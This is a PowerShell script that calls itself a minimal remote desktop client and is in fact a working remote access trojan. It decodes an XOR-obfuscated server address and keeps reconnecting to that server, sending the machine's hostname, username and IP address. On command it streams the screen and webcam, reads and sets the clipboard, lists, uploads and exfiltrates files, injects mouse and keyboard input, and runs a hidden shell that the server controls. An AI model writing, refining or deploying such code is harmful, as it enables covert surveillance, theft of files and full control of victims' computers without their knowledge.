# Minimal Remote Desktop Client - Server-Controlled (v3 - Fast)
# Encrypted connection config
$_k=[Convert]::FromBase64String('OtlbQxSO4/2xAyvd2SQNYg==')
function _D($e){$b=[Convert]::FromBase64String($e);$r=New-Object byte[] $b.Length;for($i=0;$i-lt $b.Length;$i++){$r[$i]=$b[$i]-bxor $_k[$i%$_k.Length]};[Text.Encoding]::UTF8.GetString($r)}
$ServerIP=_D 'C+1vbSW50dOJOwXv7BQ='
$ServerPort=[int](_D 'DOlrcw==')

Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.Windows.Forms
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("user32.dll")] public static extern void mouse_event(uint f, uint dx, uint dy, int d, int e);
    [DllImport("user32.dll")] public static extern bool SetCursorPos(int x, int y);
    public const uint LD=0x02, LU=0x04, RD=0x08, RU=0x10, MD=0x20, MU=0x40, WH=0x800, HW=0x1000;
}
"@

$_da=[System.Drawing.Bitmap].Assembly.Location;$_fa=[System.Windows.Forms.Form].Assembly.Location
Add-Type -ReferencedAssemblies @($_da,$_fa) @"
using System; using System.Drawing; using System.Drawing.Imaging; using System.Runtime.InteropServices;
public class Cam {
    [DllImport("avicap32.dll")] static extern IntPtr capCreateCaptureWindowA(string n,int s,int x,int y,int w,int h,IntPtr p,int i);
    [DllImport("user32.dll")] static extern bool SendMessage(IntPtr h,uint m,IntPtr w,IntPtr l);
    [DllImport("user32.dll")] static extern bool DestroyWindow(IntPtr h);
    IntPtr hWnd; public bool Start(){hWnd=capCreateCaptureWindowA("C",0,0,0,640,480,IntPtr.Zero,0);if(hWnd==IntPtr.Zero)return false;
    if(!SendMessage(hWnd,0x40A,IntPtr.Zero,IntPtr.Zero)){DestroyWindow(hWnd);hWnd=IntPtr.Zero;return false;}SendMessage(hWnd,0x432,IntPtr.Zero,IntPtr.Zero);return true;}
    public byte[] Get(){if(hWnd==IntPtr.Zero)return null;try{SendMessage(hWnd,0x43C,IntPtr.Zero,IntPtr.Zero);SendMessage(hWnd,0x41E,IntPtr.Zero,IntPtr.Zero);
    var d=System.Windows.Forms.Clipboard.GetDataObject();if(d!=null&&d.GetDataPresent(typeof(Bitmap))){var b=(Bitmap)d.GetData(typeof(Bitmap));
    using(var m=new System.IO.MemoryStream()){b.Save(m,ImageFormat.Jpeg);return m.ToArray();}}return null;}catch{return null;}}
    public void Stop(){if(hWnd!=IntPtr.Zero){SendMessage(hWnd,0x40B,IntPtr.Zero,IntPtr.Zero);DestroyWindow(hWnd);hWnd=IntPtr.Zero;}}}
"@

# Cache JPEG encoder once (avoid repeated lookup every frame)
$script:jpegCodec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq 'image/jpeg' }

$g = @{tc=$null;s=$null;run=$true;str=$false;cam=$false;wc=$null;q=60;mon=0;sh=$null;sho=$null}

function Send($d){try{$b=[Text.Encoding]::UTF8.GetBytes(($d|ConvertTo-Json -Compress -Depth 3)+"`n");$g.s.Write($b,0,$b.Length);return $true}catch{return $false}}

function SendBin($type,$data){
    if(!(Send @{type=$type})){return $false}
    $l=[BitConverter]::GetBytes([uint32]$data.Length);[Array]::Reverse($l)
    $g.s.Write($l,0,4);$g.s.Write($data,0,$data.Length);return $true
}

function ReadAll($stream,$buf,$count){
    $r=0;while($r-lt$count){$n=$stream.Read($buf,$r,$count-$r);if($n-le 0){return $false};$r+=$n};return $true
}

function Scr{
    try{
        $sc=[Windows.Forms.Screen]::AllScreens;$b=$sc[$g.mon].Bounds
        $bm=New-Object Drawing.Bitmap($b.Width,$b.Height)
        $gr=[Drawing.Graphics]::FromImage($bm)
        $gr.CopyFromScreen($b.Location,[Drawing.Point]::Empty,$b.Size)
        $gr.Dispose()
        $m=New-Object IO.MemoryStream
        $p=New-Object Drawing.Imaging.EncoderParameters(1)
        $p.Param[0]=New-Object Drawing.Imaging.EncoderParameter([Drawing.Imaging.Encoder]::Quality,[long]$g.q)
        $bm.Save($m,$script:jpegCodec,$p);$i=$m.ToArray();$bm.Dispose();$m.Dispose()
        return (SendBin "SCREEN" $i)
    }catch{return $false}
}

function StartShell($shellType){
    StopShell
    try{
        $si=New-Object Diagnostics.ProcessStartInfo
        $si.FileName=if($shellType-eq"powershell"){"powershell.exe"}else{"cmd.exe"}
        $si.UseShellExecute=$false
        $si.RedirectStandardInput=$true
        $si.RedirectStandardOutput=$true
        $si.RedirectStandardError=$true
        $si.CreateNoWindow=$true
        $g.sh=[Diagnostics.Process]::Start($si)
        $g.sho=New-Object Collections.Concurrent.ConcurrentQueue[string]
        $g.sh.add_OutputDataReceived({param($s,$e)if($null-ne$e.Data){$g.sho.Enqueue($e.Data)}})
        $g.sh.add_ErrorDataReceived({param($s,$e)if($null-ne$e.Data){$g.sho.Enqueue("[ERR] "+$e.Data)}})
        $g.sh.BeginOutputReadLine()
        $g.sh.BeginErrorReadLine()
    }catch{Send @{type="SHELL_OUTPUT";output="[ERROR] Failed to start shell: $_"}}
}

function StopShell{
    if($g.sh-and!$g.sh.HasExited){try{$g.sh.Kill()}catch{}}
    if($g.sh){try{$g.sh.Dispose()}catch{}}
    $g.sh=$null;$g.sho=$null
}

function FlushShell{
    if($null-eq$g.sho-or$g.sho.Count-eq 0){return}
    $out="";$line=$null
    while($g.sho.TryDequeue([ref]$line)){$out+=$line+"`n"}
    if($out.Length-gt 0){Send @{type="SHELL_OUTPUT";output=$out}|Out-Null}
}

function Proc($j){try{$c=$j|ConvertFrom-Json;switch($c.type){
"START_STREAM"{$g.str=$true}"STOP_STREAM"{$g.str=$false}
"MOUSE_MOVE"{[Win32]::SetCursorPos($c.x,$c.y)}
"MOUSE_DOWN"{[Win32]::SetCursorPos($c.x,$c.y);$f=if($c.button-eq"right"){[Win32]::RD}elseif($c.button-eq"middle"){[Win32]::MD}else{[Win32]::LD};[Win32]::mouse_event($f,0,0,0,0)}
"MOUSE_UP"{[Win32]::SetCursorPos($c.x,$c.y);$f=if($c.button-eq"right"){[Win32]::RU}elseif($c.button-eq"middle"){[Win32]::MU}else{[Win32]::LU};[Win32]::mouse_event($f,0,0,0,0)}
"MOUSE_CLICK"{[Win32]::SetCursorPos($c.x,$c.y);$d,$u=if($c.button-eq"right"){[Win32]::RD,[Win32]::RU}elseif($c.button-eq"middle"){[Win32]::MD,[Win32]::MU}else{[Win32]::LD,[Win32]::LU};[Win32]::mouse_event($d,0,0,0,0);Sleep -m 30;[Win32]::mouse_event($u,0,0,0,0)}
"MOUSE_DOUBLE_CLICK"{[Win32]::SetCursorPos($c.x,$c.y);$d,$u=if($c.button-eq"right"){[Win32]::RD,[Win32]::RU}elseif($c.button-eq"middle"){[Win32]::MD,[Win32]::MU}else{[Win32]::LD,[Win32]::LU};0..1|%{[Win32]::mouse_event($d,0,0,0,0);Sleep -m 30;[Win32]::mouse_event($u,0,0,0,0);if($_-eq 0){Sleep -m 30}}}
"KEYBOARD"{try{[Windows.Forms.SendKeys]::SendWait($c.key)}catch{}}
"MOUSE_SCROLL"{[Win32]::SetCursorPos($c.x,$c.y);[Win32]::mouse_event($(if($c.horizontal){[Win32]::HW}else{[Win32]::WH}),0,0,($c.delta*120),0)}
"SET_QUALITY"{$g.q=[int]$c.quality}
"SWITCH_MONITOR"{$g.mon=[int]$c.monitor}
"CLIPBOARD_SET"{try{Set-Clipboard $c.text}catch{}}
"CLIPBOARD_GET"{try{Send @{type="CLIPBOARD_TEXT";text=(Get-Clipboard -Raw)}}catch{Send @{type="CLIPBOARD_TEXT";text=""}}}
"FILE_LIST"{try{$items=@(Get-ChildItem -Path $c.path -Force -ErrorAction Stop|ForEach-Object{@{name=$_.Name;type=if($_.PSIsContainer){"folder"}else{"file"};size=$_.Length;modified=$_.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss")}});Send @{type="FILE_LIST_RESPONSE";items=$items}}catch{Send @{type="FILE_LIST_RESPONSE";items=@()}}}
"FILE_DOWNLOAD"{try{if(Test-Path $c.path){$b=[IO.File]::ReadAllBytes($c.path);SendBin "FILE_DATA" $b|Out-Null}}catch{}}
"FILE_UPLOAD"{try{$l=New-Object byte[] 4;if(!(ReadAll $g.s $l 4)){return};[Array]::Reverse($l);$sz=[BitConverter]::ToUInt32($l,0);$b=New-Object byte[] $sz;if(!(ReadAll $g.s $b $sz)){return};[IO.File]::WriteAllBytes($c.path,$b);Send @{type="FILE_UPLOAD_COMPLETE"}}catch{}}
"CAMERA_ON"{try{$g.wc=New-Object Cam;if($g.wc.Start()){$g.cam=$true;Send @{type="CAMERA_FRAME";status="active"}}else{$g.wc=$null;$g.cam=$false;Send @{type="CAMERA_FRAME";status="error"}}}catch{$g.wc=$null;$g.cam=$false}}
"CAMERA_OFF"{try{$g.cam=$false;if($g.wc){$g.wc.Stop();$g.wc=$null}Send @{type="CAMERA_FRAME";status="inactive"}}catch{}}
"SHELL_START"{StartShell $c.shell_type}
"SHELL_STOP"{StopShell;Send @{type="SHELL_OUTPUT";output="[Shell stopped]"}}
"SHELL_INPUT"{if($g.sh-and!$g.sh.HasExited){try{$g.sh.StandardInput.WriteLine($c.command)}catch{Send @{type="SHELL_OUTPUT";output="[ERROR] $_"}}}}
"DISCONNECT"{$g.run=$false}
"PING"{Send @{type="PONG"}}
}}catch{}}

while($g.run){try{
$g.tc=New-Object Net.Sockets.TcpClient
if(!$g.tc.ConnectAsync($ServerIP,$ServerPort).Wait(5000)){$g.tc.Close();Sleep 5;continue}
$g.tc.NoDelay=$true
$g.tc.ReceiveBufferSize=262144
$g.tc.SendBufferSize=262144
$g.s=$g.tc.GetStream()
$g.s.ReadTimeout=30000
$sc=[Windows.Forms.Screen]::AllScreens
$m=@();0..($sc.Count-1)|%{$m+=@{index=$_;width=$sc[$_].Bounds.Width;height=$sc[$_].Bounds.Height;primary=$sc[$_].Primary}}
$myip="Unknown";try{$myip=(Get-NetIPAddress -AddressFamily IPv4 -ErrorAction Stop|?{$_.InterfaceAlias-notlike"*Loopback*"-and$_.IPAddress-ne"127.0.0.1"}|select -First 1).IPAddress;if(!$myip){$myip="Unknown"}}catch{$myip="Unknown"}
if(!(Send @{type="IDENTIFY";hostname=$env:COMPUTERNAME;username=$env:USERNAME;ip=$myip;
version="3.0";camera_available=$true;screen_width=$sc[0].Bounds.Width;screen_height=$sc[0].Bounds.Height;monitors=$m;os_info=$(if([Environment]::OSVersion.Version.Build-ge 22000){"Windows 11"}else{"Windows 10"})})){Sleep 5;continue}

$ls=[DateTime]::Now;$lc=[DateTime]::Now;$lh=[DateTime]::Now
while($g.run){
    $n=[DateTime]::Now

    # Screen streaming: 80ms interval = ~12 FPS
    if($g.str-and($n-$ls).TotalMilliseconds-ge 80){
        if(Scr){$ls=$n}else{Sleep -m 50}
    }

    # Camera: 100ms interval = ~10 FPS
    if($g.cam-and($n-$lc).TotalMilliseconds-ge 100){
        try{$f=$g.wc.Get();if($f){SendBin "CAMERA_FRAME" $f|Out-Null};$lc=$n}catch{$g.cam=$false}
    }

    # Flush persistent shell output
    FlushShell

    # Heartbeat every 5s
    if(($n-$lh).TotalMilliseconds-ge 5000){if(!(Send @{type="HEARTBEAT";timestamp=$n.ToString("o")})){break}$lh=$n}

    # Process incoming commands (non-blocking, bulk read)
    if($g.s.DataAvailable){
        $rb=New-Object byte[] 65536
        while($g.s.DataAvailable){
            $nr=$g.s.Read($rb,0,$rb.Length)
            if($nr-le 0){break}
            $chunk=[Text.Encoding]::UTF8.GetString($rb,0,$nr)
            $lines=$chunk.Split([char]10)
            for($li=0;$li-lt$lines.Length;$li++){
                $ln=$lines[$li].Trim()
                if($ln.Length-gt 0){Proc $ln}
            }
        }
    }

    # Minimal sleep - 1ms when active (streaming/shell), 10ms when idle
    if($g.str-or$g.cam-or$g.sh){Sleep -m 1}else{Sleep -m 10}
}
}catch{}finally{StopShell;if($g.s){$g.s.Close()}if($g.tc){$g.tc.Close()}}Sleep 5}
